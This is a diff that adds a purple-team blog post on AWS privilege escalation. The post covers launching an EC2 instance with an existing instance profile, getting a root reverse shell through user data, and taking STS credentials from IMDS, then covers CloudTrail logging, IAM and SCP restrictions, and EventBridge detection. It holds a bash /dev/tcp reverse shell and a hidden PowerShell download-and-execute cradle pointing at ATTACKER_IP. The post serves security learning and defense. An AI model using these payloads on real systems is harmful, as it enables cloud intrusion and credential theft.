@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <style>
+    .center {
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+      width: 50%;
+    }
+
+    code {
+      display: block;
+      font-family: Consolas,"courier new";
+      color: crimson;
+      background-color: #f1f1f1;
+      padding: 2px;
+      font-size: 105%;
+      white-space: pre;
+    }
+
+    inline-code {
+      font-family: Consolas, "Courier New";
+      color: crimson;
+      /* background-color: #f1f1f1; */
+      padding: 2px 4px;
+      font-size: 105%;
+      border-radius: 3px;   /* optional */
+      display: inline;      /* ensures it never becomes a block */
+    }
+  </style>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <title>Byron's Blog!</title>
+
+  <!-- Bootstrap core CSS -->
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Custom fonts for this template -->
+  <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+  <!-- Custom styles for this template -->
+  <link href="css/clean-blog.min.css" rel="stylesheet">
+
+  <link rel="icon" type="image/png" href="img/favicon.ico">
+
+</head>
+
+<body>
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="index.html">Home</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="about.html">About</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="contact.html">Contact</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('img/cloud_security.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+            <h1>Exploring EC2 User Data and Privilege Escalation in AWS</h1>
+            <h2 class="subheading">#AWS #Security #PrivilegeEscalation #IMDS</h2>
+            <span class="meta">Posted on November 23, 2025</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>I have recently started looking into AWS security for work and came across this <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/" target="_blank">Rhino Labs AWS Privilege Escalation</a> blog post. It is a few years old, but still looks relevant and I noticed that the author is also the founding dev of the <a href="https://github.com/RhinoSecurityLabs/Pacu" target="_blank">Pacu</a> project... Seems like a great person to learn from! I have decided I will be doing deep dives on some of the techniques described in the blog post to get up to speed with some of the privesc techniques in AWS, starting with... 
+
+          <p>The 3rd escalation technique mentioned: "Creating an EC2 instance with an existing instance profile". It mentions spinning up an EC2 instance, but using an existing EC2 instance profile which has higher privileges than you have. You then need to find a way to log into the EC2 to request the AWS keys associated with the EC2 instance profile using the EC2 Instance Meta Data API. In the Rhino Labs blog they mention using EC2 user data to get a reverse shell from the instance, which is more exciting than SSH or SSM, so this blog covers this method.</p>
+
+          <p>Because this blog is about purple teaming, it will also cover how to detect someone doing this and how the AWS account can be setup to prevent an attacker from executing this privesc attack chain.</p>
+
+          <h2 class="section-heading">EC2 Instance Profile and (IMDS) Instance Metadata Service</h2>
+
+          <p>EC2 instances do not directly assume IAM roles. They instead use instance profiles, which are wrappers around a single IAM role and are the only mechanism AWS provides for attaching a role to an EC2 instance. The IAM role becomes the principal for all AWS API calls made from processes running on the instance. The EC2 instance itself is not a principal, it is just a virtual machine and AWS has no identity construct for it. One benefit of instance profiles is that they can be hot-swapped on a running instance using the <inline-code>DisassociateIamInstanceProfile</inline-code> and <inline-code>AssociateIamInstanceProfile</inline-code> APIs. <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_switch-role-ec2_instance-profiles.html" target="_blank">ref</a></p>
+          
+          <p>When an IAM role is used, temporary credentials must be requested from STS (AWS Security Token Service). These credentials are then used in AWS API calls, allowing AWS to authenticate the role that made the request.</p>
+          
+          <p>The IMDS (Instance Metadata Service) listens on the link-local address: <inline-code>169.254.169.254</inline-code> on every EC2 instance. This service is used to retrieve the temporary credentials for the IAM role attached through the instance profile. For example, imagine a Python script running on an EC2 instance that needs to write data to an S3 bucket. The script uses the Boto library, which must determine how to authenticate. It would usually check environment variables and the local AWS credentials file, but when running on EC2 or ECS it will automatically query IMDS for credentials. IMDS then requests temporary credentials from STS for the role associated with the instance profile and returns them to the application. With these credentials, and assuming the role’s IAM policy and the S3 bucket policy permit access, the Python script can write to the S3 bucket. <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html" target="_blank">ref</a></p>
+
+          <h2 class="section-heading">Steeling Instance Profiles</h2>
+
+          <p>
+            Not much can be done to limit which instance profiles an EC2 instance can assume. Basically if there are instance profiles that exist in the account, then you can attach them to an EC2 that you are spinning up. This is all assuming that you have the permissions to spin up EC2 instances.
+
+            This is the main point of the post which is a little underwhelming, but its really worth keeping in mind that roles that you create for your EC2 instances can be hijacked by users in the account if they can also spin up EC2 instances.
+            <br><br>
+            Roles in the account or Service Control Policies (SCPs) can limit who can spin up EC2 instances. SCPs are defined at an organisation level and I did not test SCPs in this blog post. The below hypothetical SCP example would only allow the role that your CICD users run with to spin up EC2 instances and you could have additional controls in place in your repos to prevent malicious pull/merge requests:
+
+            <p></p>
+            
+<code>{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Sid": "DenyEC2RunInstancesExceptCICD",
+      "Effect": "Deny",
+      "Action": "ec2:RunInstances",
+      "Resource": "*",
+      "Condition": {
+        "StringNotLike": {
+          "aws:PrincipalArn": "arn:aws:iam::*:role/CICD-*
+        }
+      }
+    }
+  ]
+}</code>
+          </p>
+
+          <h2 class="section-heading">What is EC2 User Data?</h2>
+
+          <p>EC2 User Data is a mechanism provided by AWS to run commands or scripts automatically when an instance boots for the first time. It was originally intended to bootstrap instances (e.g. installing packages, configuring environment variables, downloading code)</p>
+
+          <p>On Linux, scripts specified in User Data are run as root by cloud-init. On Windows, EC2Launch executes PowerShell scripts automatically at first boot, also with administrative privileges. <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html" target="_blank">ref</a></p>
+
+
+          <h2 class="section-heading">Demo Time</h2>
+
+          <p>
+            For this post I created an IAM role called "ec2-s3-rw" which grants all permissions to a specific S3 object with the following policy:
+            
+            <br><br>
+
+<code>{
+  "Version": "2012-10-17",
+  "Statement": [
+      {
+        "Sid": "VisualEditor0",
+        "Effect": "Allow",
+        "Action": "s3:*",
+        "Resource": "arn:aws:s3:::priv-test-blog/bogglez.txt",
+      }
+  ]
+}</code>
+            <br>
+            I then create an EC2 instance and select this role so AWS created an instance profile (note: even after deleting the EC2 the instance profile will remain in the account). Next I spun up an EC2 instance to act as a shell receiver and another EC2 which used the previously created instance profile so would have permissions to read and write to the S3 bucket (lets call this EC2: "S3_reader"). I also set this EC2 instances' User Data to return a shell to the shell receiver (All security groups were setup to facilitate this and a nc listener was waiting for this connection): 
+            
+            <br><br>
+
+<code>#!/bin/bash
+bash -i >& /dev/tcp/172.31.34.136/60000 0>&1
+</code> 
+          
+          </p>
+
+          <p>
+            A shell was returned from the S3_reader EC2 on it's first boot. Theoretically restarts could also get the User Data to run again, which is convenient because it can be modified on an instance that is in the stopped state, but I honestly couldn't get this working (didn't try very hard though). The shell is returned for the root user because User Data runs as root. The IMDS is then queried using the link-local address (169.254.169.254) to get the temp credentials that are associated with the instance profile role. This can all be seen in the screenshot below:
+          </p>
+
+          </br>
+          <img class="img-fluid" src="img/aws_1/final_shell_cred_dump.png" alt="">
+          <span class="caption text-muted">Root shell from User Data and dumping STS credentials</span>
+
+          <p>
+            These credentials can now be used from anywhere to read from the S3 bucket. Note, that as mentioned in the Rhino Security Labs post, GuardDuty will detect these credentials being used off of the EC2 instance. For the demo I wanted to generate CloudTrail logs for reading from the S3 from outside the EC2, so I copied the credentials over to my Kali machine and installed the AWS CLI to read the file I had placed in the S3 bucket:
+          </p>
+
+          </br>
+          <img class="img-fluid" src="img/aws_1/credentials_file.png" alt="">
+          <span class="caption text-muted">Credentials file on Kali machine</span>
+          
+          </br>
+          <img class="img-fluid" src="img/aws_1/get_s3_file_content.png" alt="">
+          <span class="caption text-muted">Reading the S3 content using the stolen credentials</span>
+          
+          <p>
+            I then played around with mechanisms to prevent using the roles credentials from outside the EC2 it was intended for. I first tried limiting this with a condition in the role which states that the source VPC must be the one the EC2 instance is in: 
+          </p>
+
+          </br>
+          <img class="img-fluid" src="img/aws_1/S3_policy_vpc_restriction.png" alt="">
+          <span class="caption text-muted">Limiting the role use to within a specific VPC</span>
+
+          <p>
+            This actually didn't help and I was still able to use the credentials from outside the VPC... So I either messed up the policy (which would be strange because I was using the AWS console), or it seems that when you don't pass a VPC in with the API request this is just ignored. If this is the case, I think AWS should rather deny requests that don't contain a VPC for roles that include this condition. I would need to do more testing though before emailing Jeff about this...
+          </p>
+
+          <p>
+            Another restriction in the policy could be IP address:
+          </p>
+
+          <img class="img-fluid" src="img/aws_1/ip_restriction_iam_policy.png" alt="">
+          <span class="caption text-muted">Limiting the role use to a specific IP address</span>
+
+          <p>
+            The IP set above is the S3_reader EC2 instance, so I could make sure the role still worked from there. This role update immediately prevented the role from being used from my Kali machine:
+          </p>
+
+          </br>
+          <img class="img-fluid" src="img/aws_1/forbidden_source_ip.png" alt="">
+          <span class="caption text-muted">403 returned after limiting which IP address could use the role</span>
+
+          <h2 class="section-heading">Wots in the Logs</h2>
+
+          I was collecting CloudTrail logs during the testing (S3 logs need the S3 data events turned on), so was able to view some of the suspicious actions in the demo. Here are some points and thoughts about the logs:
+
+        </br></br>
+          
+            <li>We can not see STS credentials being requested via the IMDS because this is not logged. We would need an agent on the EC2 to see this activity.</li>
+            <li>In the S3 data events we can see the log that GuardDuty is likely using for its detection. Note that in the userIdentity the EC2 instance ID is shown in the principalId and arn, but the source IP and user agent are obviously not: </li>
+            <br>
+            <code>
+{
+  "eventVersion": "1.11",
+  "userIdentity": {
+      "type": "AssumedRole",
+      "principalId": "AROAZ5UWVVHTBK3A5LMMW:i-056ad10040e86e01f",
+      "arn": 
+        "arn:aws:sts::682142050790:assumed-role/ec2-s3-rw/
+                                      i-056ad10040e86e01f",
+      "accountId": "682142050790",
+      "accessKeyId": "ASIAZ5UWVVHTJEKBDCJ3",
+      "sessionContext": {
+          "sessionIssuer": {
+              "type": "Role",
+              "principalId": "AROAZ5UWVVHTBK3A5LMMW",
+              "arn": "arn:aws:iam::682142050790:role/ec2-s3-rw",
+              "accountId": "682142050790",
+              "userName": "ec2-s3-rw"
+          },
+          "attributes": {
+              "creationDate": "2025-12-20T15:13:10Z",
+              "mfaAuthenticated": "false"
+          },
+          "ec2RoleDelivery": "2.0"
+      }
+  },
+  "eventTime": "2025-12-20T16:33:31Z",
+  "eventSource": "s3.amazonaws.com",
+  "eventName": "HeadObject",
+  "awsRegion": "eu-west-2",
+  "sourceIPAddress": "177.252.141.232",
+  "userAgent": "[aws-cli/2.32.11 md/awscrt#0.29.1 ua/2.1 
+  os/linux#6.6.9-amd64 md/arch#x86_64 lang/python#3.13.9 
+  md/pyimpl#CPython m/E,G,b,Z cfg/retry-mode#standard 
+  md/installer#exe md/distrib#kali.2024 md/prompt#off 
+  md/command#s3.cp]",
+  "requestParameters": {
+      "bucketName": "priv-test-blog",
+      "Host": "priv-test-blog.s3.eu-west-2.amazonaws.com",
+      "key": "bogglez.txt"
+  },
+  ...
+}</code> 
+
+
+            <li>An identical log to the one above exists for the GetObject eventName in the S3 data events</li>
+            <li>Because these logs live in the S3 data events, if you are not collecting them you won't see the role being used outside of the EC2</li>
+            <li>I could not find the Access Key: ASIAZ5UWVVHTJEKBDCJ3 in any other generic CloudTrail logs</li>
+            <li>The EC2 User Data being set can be seen in the <inline-code>eventName: "ModifyInstanceAttribute"</inline-code> log by filtering for <inline-code></inline-code>requestParameters.userData=*</inline-code>. The actual content of the User Data is redacted though, so can't be inspected for malicious content</li>
+
+          <h2 class="section-heading">SSH, SSM, and the Bypass</h2>
+
+          <p>Typically, SSH keys or AWS Systems Manager (SSM) are used to administer EC2 instances. But if those are disabled or inaccessible, an attacker who can supply or modify user data can execute commands as root. This allows them to query the Instance Metadata Service (IMDS) over the local link address <code>169.254.169.254</code> to retrieve temporary AWS credentials for the instance’s attached role.</p>
+
+          <p>Why does this work? The EC2 instance itself does not store credentials permanently. Instead, IMDS fetches temporary credentials on-demand from AWS STS (Security Token Service) for the role attached via the instance profile. Any process running on the instance can reach IMDS via the link-local IP, bypassing firewalls or lack of external access.</p>
+
+          <h2 class="section-heading">Example Payloads</h2>
+
+          <p>Here are simple demonstration payloads showing how an attacker could leverage User Data for a shell. <strong>These are for demonstration only, do not use in production or on unowned environments.</strong></p>
+
+          <p><u>Linux (Netcat Reverse Shell Example)</u>:</p>
+          <code>#!/bin/bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code>
+
+          <p><u>Windows (PowerShell Reverse Shell Example)</u>:</p>
+          <code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"</code>
+
+          <p>Both payloads are executed with full administrative privileges on first boot through user data, demonstrating why User Data can be a critical escalation vector.</p>
+
+          <h2 class="section-heading">Preventing Abuse of EC2 User Data</h2>
+
+          <p>You cannot disable User Data entirely, but you can control its use:</p>
+          <ul>
+            <li>Use Service Control Policies (SCPs) to restrict <code>ec2:RunInstances</code> or <code>ec2:ModifyInstanceAttribute</code> unless performed by trusted roles.</li>
+            <li>Whitelist approved launch templates or AMIs, which enforce safe user data.</li>
+            <li>Enforce the use of IMDSv2 to reduce SSRF attacks (though this does not prevent local exploitation).</li>
+            <li>Separate duties for deployment and operational roles to minimize <code>iam:PassRole</code> abuse.</li>
+          </ul>
+
+          <h2 class="section-heading">Observing User Data Activity in CloudWatch</h2>
+
+          <p>CloudTrail logs EC2 API calls such as <code>RunInstances</code> and <code>ModifyInstanceAttribute</code>. Suspicious patterns include:</p>
+          <ul>
+            <li>Instances launched with unexpected user data scripts</li>
+            <li>Modification of existing instance attributes, including user data</li>
+            <li>AssumeRole events following a newly launched instance</li>
+          </ul>
+
+          <p>CloudWatch Alarms or EventBridge rules can be set up to trigger on these events:</p>
+          <code>
+          {
+            "source": ["aws.ec2"],
+            "detail-type": ["AWS API Call via CloudTrail"],
+            "detail": {
+              "eventName": ["RunInstances", "ModifyInstanceAttribute"],
+              "requestParameters": {
+                "userData": [{"exists": true}]
+              }
+            }
+          }
+          </code>
+
+          <p>Alerts can notify security teams immediately if instances are launched or modified with unexpected user data, allowing quick investigation and remediation.</p>
+
+          <h2 class="section-heading">Conclusion</h2>
+
+          <p>EC2 User Data is a powerful tool for automation but can be misused for privilege escalation. Understanding its interaction with IMDS, instance profiles, and temporary credentials is essential for defenders. By controlling who can launch instances, restricting user data, separating roles, and monitoring CloudTrail events, you can greatly reduce the risk of abuse.</p>
+
+          <p>If you are digging deeper into AWS security, exploring techniques like this is a great way to understand both attack and defense strategies.</p>
+          
+          <h2 class="section-heading">Bonus: Additional things learnt</h2>
+
+          <li>The instance profile associated with the EC2 is hot swappable, just call: DisassociateIamInstanceProfile and AssociateIamInstanceProfile</li>
+          <li>Calling: DisassociateIamInstanceProfile or AssociateIamInstanceProfile generates CloudTrail logs</li>
+          <li>When an IAM role is revoked the STS creds associated with the role keep working until they expire</li>
+          <li>When an IAM role is revoked the role stops working for the instance using the role, so any STS keys generated by the instance from that point on don't work. This can be fixed if the role is re-associated with the instance using the DisassociateIamInstanceProfile/AssociateIamInstanceProfile API calls.</li>
+
+        </div>
+      </div>
+    </div>
+  </article>
+
+  <hr>
+
+  <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            <li class="list-inline-item">
+              <a href="https://twitter.com/ByronRudman">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            <li class="list-inline-item">
+              <a href="https://www.linkedin.com/in/byron-rudman-114b2878/">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            <li class="list-inline-item">
+              <a href="https://github.com/brudman">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="vendor/jquery/jquery.min.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+  <!-- Custom scripts for this template -->
+  <script src="js/clean-blog.min.js"></script>
+
+</body>
+
+</html>
